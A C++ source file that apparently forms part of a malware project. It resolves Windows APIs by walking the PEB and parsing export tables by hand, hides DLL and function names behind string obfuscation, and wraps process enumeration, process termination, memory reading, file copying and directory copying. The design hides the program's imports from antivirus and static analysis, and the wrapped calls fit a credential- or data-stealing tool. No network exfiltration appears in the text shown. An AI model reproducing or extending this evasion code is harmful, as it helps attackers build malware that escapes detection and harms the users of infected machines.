#include "winapi_structs.h"
#include "PEB.h"
#include <windows.h>
#include <wchar.h>
#include <iostream>
#include <string>
#include <filesystem>
#include "obfusheader.h"
//keep this or unresolved external
#pragma comment(lib, "Crypt32.lib")
//
namespace fs = std::filesystem;

#ifndef CONTAINING_RECORD
#define CONTAINING_RECORD(address, type, field) ((type *)((LPBYTE)(address) - (ULONG_PTR)(&((type *)0)->field)))
#endif

wchar_t* HiddenCalls::extractor(LPCWSTR str1) {
    static wchar_t dll_str[50];
    int len = wcslen(str1);
    int loop_to = len + 1;
    int loop_from = 0;

    for (int i = len - 1; i >= 0; i--) {
        if (str1[i] == L'\\') {
            loop_from = i + 1;
            break;
        }
    }

    int incre = 0;
    for (int j = loop_from; j < loop_to; j++) {
        dll_str[incre++] = str1[j];
    }

    dll_str[incre] = L'\0';
    return dll_str;
}

HMODULE HiddenCalls::CustomGetModuleHandleW(LPCWSTR dllName) {
#ifdef _WIN64
    PPEB PEB_pointer = (PPEB)__readgsqword(OBF(0x60));
#elif _WIN32
    PPEB PEB_pointer = (PPEB)__readfsdword(OBF(0x30));
#endif

    PPEB_LDR_DATA Ldr_pointer = PEB_pointer->LoaderData;
    PLIST_ENTRY head = &(Ldr_pointer->InMemoryOrderModuleList);
    PLIST_ENTRY current_Position = head->Flink;

    while (current_Position != head) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(current_Position, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (module->FullDllName.Length != 0) {
            if (_wcsicmp(extractor(module->FullDllName.Buffer), dllName) == 0) {
                return (HMODULE)module->DllBase;
            }
        }
        else {
            break;
        }
        current_Position = current_Position->Flink;
    }
    return NULL;
}

FARPROC HiddenCalls::CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (!hModule || !lpProcName) return nullptr;

    DWORD_PTR baseAddress = reinterpret_cast<DWORD_PTR>(hModule);
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(baseAddress + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    auto exportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        );

    auto names = reinterpret_cast<DWORD*>(baseAddress + exportDirectory->AddressOfNames);
    auto ordinals = reinterpret_cast<WORD*>(baseAddress + exportDirectory->AddressOfNameOrdinals);
    auto functions = reinterpret_cast<DWORD*>(baseAddress + exportDirectory->AddressOfFunctions);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, reinterpret_cast<LPCSTR>(baseAddress + names[i])) == 0) {
            return reinterpret_cast<FARPROC>(baseAddress + functions[ordinals[i]]);
        }
    }
    return nullptr;
}



HANDLE HiddenCalls::CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return nullptr;

    auto func = reinterpret_cast<decltype(&::CreateToolhelp32Snapshot)>(CustomGetProcAddress(hModule, OBF("CreateToolhelp32Snapshot")));
    if (!func) return nullptr;

    return func(dwFlags, th32ProcessID);
}

BOOL HiddenCalls::Process32First(const HANDLE& hSnapshot, LPPROCESSENTRY32 lppe) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::Process32First)>(CustomGetProcAddress(hModule, OBF("Process32First")));
    if (!func) return FALSE;

    return func(hSnapshot, lppe);
}

BOOL HiddenCalls::Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::Process32Next)>(CustomGetProcAddress(hModule, OBF("Process32Next")));
    if (!func) return FALSE;

    return func(hSnapshot, lppe);
}

BOOL HiddenCalls::CloseHandle(HANDLE hObject) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::CloseHandle)>(CustomGetProcAddress(hModule, OBF("CloseHandle")));
    if (!func) return FALSE;

    return func(hObject);
}

BOOL HiddenCalls::GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::GetExitCodeProcess)>(CustomGetProcAddress(hModule, OBF("GetExitCodeProcess")));
    if (!func) return FALSE;

    return func(hProcess, lpExitCode);
}

BOOL HiddenCalls::TerminateProcess(HANDLE hProcess, UINT uExitCode) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::TerminateProcess)>(CustomGetProcAddress(hModule, OBF("TerminateProcess")));
    if (!func) return FALSE;

    return func(hProcess, uExitCode);
}

HANDLE HiddenCalls::OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return nullptr;

    auto func = reinterpret_cast<decltype(&::OpenProcess)>(CustomGetProcAddress(hModule, OBF("OpenProcess")));
    if (!func) return nullptr;

    return func(dwDesiredAccess, bInheritHandle, dwProcessId);
}

BOOL HiddenCalls::CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return false;

    auto func = reinterpret_cast<decltype(&::CreateProcessW)>(CustomGetProcAddress(hModule, OBF("CreateProcessW")));
    if (!func) return false;

    return func(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

HANDLE HiddenCalls::CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return nullptr;

    auto func = reinterpret_cast<decltype(&::CreateFileA)>(CustomGetProcAddress(hModule, OBF("CreateFileA")));
    if (!func) return nullptr;

    return func(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

DWORD HiddenCalls::GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return 0;

    auto func = reinterpret_cast<decltype(&::GetFileSize)>(CustomGetProcAddress(hModule, OBF("GetFileSize")));
    if (!func) return 0;

    return func(hFile, lpFileSizeHigh);
}

HANDLE HiddenCalls::CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return nullptr;

    auto func = reinterpret_cast<decltype(&::CreateFileMappingA)>(CustomGetProcAddress(hModule, "CreateFileMappingA"));
    if (!func) return nullptr;

    return func(hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);
}

LPVOID HiddenCalls::MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return nullptr;

    auto func = reinterpret_cast<decltype(&::MapViewOfFile)>(CustomGetProcAddress(hModule, OBF("MapViewOfFile")));
    if (!func) return nullptr;

    return func(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
}

BOOL HiddenCalls::UnmapViewOfFile(LPCVOID lpBaseAddress) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::UnmapViewOfFile)>(CustomGetProcAddress(hModule, OBF("UnmapViewOfFile")));
    if (!func) return FALSE;

    return func(lpBaseAddress);
}


BOOL HiddenCalls::ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::ReadFile)>(CustomGetProcAddress(hModule, OBF("ReadFile")));
    if (!func) return FALSE;

    return func(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

BOOL HiddenCalls::WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::WriteFile)>(CustomGetProcAddress(hModule, OBF("WriteFile")));
    if (!func) return FALSE;

    return func(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

BOOL HiddenCalls::DeleteFileA(LPCSTR lpFileName) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::DeleteFileA)>(CustomGetProcAddress(hModule, OBF("DeleteFileA")));
    if (!func) return FALSE;

    return func(lpFileName);
}
BOOL HiddenCalls::CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::CreateDirectoryA)>(CustomGetProcAddress(hModule, OBF("CreateDirectoryA")));
    if (!func) return FALSE;

    return func(lpPathName, lpSecurityAttributes);
}

BOOL HiddenCalls::CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::CopyFileA)>(CustomGetProcAddress(hModule, OBF("CopyFileA")));
    if (!func) return FALSE;

    return func(lpExistingFileName, lpNewFileName, bFailIfExists);
}

HMODULE HiddenCalls::CustomLoadLibraryExA(LPCSTR lpLibFileName, DWORD dwFlags) {
    HMODULE hKernel32 = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hKernel32) return nullptr;

    FARPROC pLoadLibraryExA = CustomGetProcAddress(hKernel32, OBF("LoadLibraryExA"));
    if (!pLoadLibraryExA) return nullptr;

    using LoadLibraryExA_t = HMODULE(WINAPI*)(LPCSTR, HANDLE, DWORD);
    LoadLibraryExA_t pLoadLibraryExAFunc = (LoadLibraryExA_t)pLoadLibraryExA;

    return pLoadLibraryExAFunc(lpLibFileName, NULL, dwFlags);
}

UINT HiddenCalls::GetTempPathA(UINT nBufferLength, LPSTR lpBuffer) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return 0;

    auto func = reinterpret_cast<decltype(&::GetTempPathA)>(CustomGetProcAddress(hModule, OBF("GetTempPathA")));
    if (!func) return 0;

    return func(nBufferLength, lpBuffer);
}


BOOL HiddenCalls::ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::ReadProcessMemory)>(CustomGetProcAddress(hModule, OBF("ReadProcessMemory")));
    if (!func) return FALSE;

    return func(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
}

BOOL HiddenCalls::VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    HMODULE hModule = CustomGetModuleHandleW(OBF(L"Kernel32.dll"));
    if (!hModule) return FALSE;

    auto func = reinterpret_cast<decltype(&::VirtualQueryEx)>(CustomGetProcAddress(hModule, OBF("VirtualQueryEx")));
    if (!func) return FALSE;

    return func(hProcess, lpAddress, lpBuffer, dwLength);
}

BOOL HiddenCalls::CopyDirectory(const std::string& srcDir, const std::string& destDir) {
    try {
        if (!fs::exists(srcDir) || !fs::is_directory(srcDir)) {
            return FALSE;
        }

        if (!fs::exists(destDir)) {
            HiddenCalls::CreateDirectoryA(destDir.c_str(), NULL);
        }

        for (const auto& entry : fs::recursive_directory_iterator(srcDir)) {
            std::string relativePath = entry.path().string().substr(srcDir.length() + 1);
            std::string destinationPath = destDir + "\\" + relativePath;

            if (fs::is_directory(entry)) {
                HiddenCalls::CreateDirectoryA(destinationPath.c_str(), NULL);
            }
            else {
                HiddenCalls::CopyFileA(entry.path().string().c_str(), destinationPath.c_str(), FALSE);
            }
        }

        return TRUE;
    }
    catch (...) {
        return FALSE;
    }
}

